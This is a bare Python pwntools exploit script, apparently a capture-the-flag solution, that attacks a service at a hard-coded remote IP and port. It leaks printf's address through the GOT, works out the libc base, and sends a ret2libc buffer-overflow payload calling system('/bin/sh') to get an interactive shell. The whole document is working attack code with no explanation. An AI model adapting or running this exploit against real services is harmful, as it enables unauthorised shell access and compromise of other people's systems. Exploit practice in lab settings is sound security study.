from pwn import *
p=remote('121.42.189.18',10004)
#p=process('./pwn2')
printf_got=134520848
offset=60
print p.recvrepeat(1)
p.sendline(str(134520848))
data= p.recvuntil('\n')
print data[-11:]
printf_addr=int(data[-11:],16)
log.info(hex(printf_addr))
libc=ELF('./libc6_2.23-0ubuntu9_i386.so')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
base=printf_addr-libc.symbols['printf']
libc.address=base
bash=libc.search('/bin/sh').next()
system_addr=libc.symbols['system']
payload='A'*offset+p32(libc.symbols['system'])+p32(0xdeadbeef)+p32(bash)
#raw_input("YY")
p.sendline(payload)
p.interactive();
